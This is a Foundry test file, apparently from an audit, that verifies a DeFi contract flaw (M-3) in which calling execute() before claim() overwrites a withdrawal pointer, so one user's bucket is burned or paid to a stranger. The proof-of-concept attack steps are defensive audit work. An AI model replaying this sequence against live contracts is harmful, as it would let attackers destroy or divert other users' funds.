// SPDX-License-Identifier: MIT
pragma solidity 0.8.36;

import {Test} from "forge-std/Test.sol";
import {IERC20} from "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";

import {IConfidentialTrigger} from "../../src/Interfaces.sol";
import {IConfidentialTrigger} from "../../src/Interfaces.sol";
import {Trimmy} from "../../src/Trimmy.sol";
import {MockERC20, MockFtsoV2, MockRegistry, MockQueuedVault} from "../mocks/Mocks.sol";

/// Adversarial verification of M-3. Two questions the original PoC did not answer:
///   (a) does the loss need the narrow pre-midnight window, or can anyone force it on demand?
///   (b) is the stranded bucket really unrecoverable?
contract VerifyM3Test is Test {
    address internal constant REGISTRY_ADDR = 0xaD67FE66660Fb8dFE9d6b1b4240d8650e30F6019;
    bytes21 internal constant FEED_XRP =
        bytes21(uint168(0x015852502f55534400000000000000000000000000));

    Trimmy internal trimmy;
    MockERC20 internal fxrp;
    MockFtsoV2 internal ftso;
    MockRegistry internal registry;
    MockQueuedVault internal vault;

    address internal account = makeAddr("victim");
    address internal other = makeAddr("otherUser");
    address internal keeper = makeAddr("keeper");
    address internal griefer = makeAddr("griefer");
    address internal feeSink = makeAddr("feeSink");

    function setUp() public {
        vm.warp(10 days);
        fxrp = new MockERC20("FTestXRP", "FXRP", 6);
        ftso = new MockFtsoV2();
        registry = new MockRegistry();
        vm.etch(REGISTRY_ADDR, address(registry).code);
        MockRegistry(REGISTRY_ADDR).setFtso(address(ftso));
        vault = new MockQueuedVault(IERC20(address(fxrp)));

        Trimmy.TokenCfg[] memory tokens = new Trimmy.TokenCfg[](1);
        tokens[0] = Trimmy.TokenCfg({token: address(vault), feedId: FEED_XRP, decimals: 6});
        Trimmy.VenueCfg[] memory venues = new Trimmy.VenueCfg[](1);
        venues[0] = Trimmy.VenueCfg({
            target: address(vault), kind: Trimmy.VenueKind.QUEUED_VAULT, feeTier: 0
        });
        trimmy = new Trimmy(tokens, venues, 60, feeSink, IConfidentialTrigger(address(0)));

        _fund(account);
        _fund(other);
        _feeds();
    }

    function _fund(address who) internal {
        fxrp.mint(who, 1_000_000e6);
        vm.startPrank(who);
        fxrp.approve(address(vault), type(uint256).max);
        vault.deposit(1000e6, who);
        vault.approve(address(trimmy), type(uint256).max);
        vm.stopPrank();
    }

    function _feeds() internal {
        ftso.setFeed(FEED_XRP, 3_000_000, 6, uint64(vm.getBlockTimestamp()));
    }

    function _arm(address who, uint128 total, uint128 part, uint64 interval)
        internal
        returns (uint256)
    {
        Trimmy.RuleParams memory p = Trimmy.RuleParams({
            sellTokenId: 0,
            buyTokenId: 0,
            verb: Trimmy.Verb.EXIT_VAULT,
            venueId: 0,
            trigger: Trimmy.Trigger.SCHEDULE,
            totalSellAmount: total,
            partSellAmount: part,
            minOutAbsolute: 0,
            triggerValue: interval,
            expiry: uint64(block.timestamp + 300 days),
            slippageBips: 0,
            protocolFeeBips: 0,
            keeperFeeFlat: 0,
            keeperFeeBudget: 0
        });
        vm.prank(who);
        return trimmy.arm(p);
    }

    /// (a) No special window needed. A DAILY drip loses a bucket on every part whenever
    ///     execute() is ordered before claim() — and both are permissionless, so an attacker
    ///     with a full block of gas chooses that ordering himself.
    function test_M3_grief_executeBeforeClaimBurnsTheBucket() public {
        uint256 id = _arm(account, 100e6, 50e6, 1 days);

        vm.prank(keeper);
        trimmy.execute(id); // part 1 -> period P
        uint64 P = trimmy.ruleAt(id).claimPeriod;
        assertEq(vault.pendingWithdrawAssets(address(trimmy), P), 50e6, "bucket P funded");

        // A full day later. claim(P) is now possible: claimableAt has passed.
        vm.warp(vm.getBlockTimestamp() + 1 days);
        _feeds();
        assertGe(vm.getBlockTimestamp(), trimmy.ruleAt(id).claimableAt, "claim is possible now");

        // The griefer simply calls execute() first. Nothing in the contract requires that a
        // claimable bucket be claimed before a new one is opened.
        vm.prank(griefer);
        trimmy.execute(id); // part 2 -> period P+1, OVERWRITES claimPeriod

        assertEq(uint256(trimmy.ruleAt(id).claimPeriod), uint256(P) + 1, "pointer moved");

        vm.warp(vm.getBlockTimestamp() + 2 days);
        _feeds();
        uint256 before = fxrp.balanceOf(account);
        vm.prank(keeper);
        trimmy.claim(id);
        uint256 paid = fxrp.balanceOf(account) - before;

        assertEq(trimmy.ruleAt(id).pendingShares, 0, "pendingShares wiped wholesale");
        vm.prank(keeper);
        vm.expectRevert(Trimmy.NothingPending.selector);
        trimmy.claim(id); // no second chance

        assertEq(vault.pendingWithdrawAssets(address(trimmy), P), 50e6, "bucket P still in vault");
        assertEq(paid, 100e6, "victim burned 100e6 shares and must be paid 100e6 assets");
    }

    /// (b) The bucket is not merely stranded: a stranger's rule that filed under the same
    ///     period sweeps it. claimWithdraw pays out the whole (Trimmy, period) bucket to
    ///     whichever rule claims it, and _settle sends that to THAT rule's account.
    function test_M3_strandedBucketIsPaidToADifferentUser() public {
        uint256 victimId = _arm(account, 100e6, 50e6, 60);
        uint256 otherId = _arm(other, 50e6, 50e6, 60);

        // Both file under the same period P.
        vm.prank(keeper);
        trimmy.execute(victimId);
        uint64 P = trimmy.ruleAt(victimId).claimPeriod;
        vm.prank(keeper);
        trimmy.execute(otherId);
        assertEq(trimmy.ruleAt(otherId).claimPeriod, P, "same bucket");
        assertEq(vault.pendingWithdrawAssets(address(trimmy), P), 100e6, "pooled");

        // The victim's rule fires a second part on the next day: pointer overwritten.
        vm.warp(vm.getBlockTimestamp() + 1 days);
        _feeds();
        vm.prank(keeper);
        trimmy.execute(victimId);
        assertEq(uint256(trimmy.ruleAt(victimId).claimPeriod), uint256(P) + 1);

        // The stranger claims period P and collects BOTH.
        vm.warp(vm.getBlockTimestamp() + 2 days);
        _feeds();
        uint256 beforeOther = fxrp.balanceOf(other);
        vm.prank(keeper);
        trimmy.claim(otherId);
        uint256 otherPaid = fxrp.balanceOf(other) - beforeOther;

        emit log_named_uint("stranger redeemed 50e6 shares and received", otherPaid);
        assertEq(otherPaid, 50e6, "a rule must never be paid another rule's assets");
    }
}
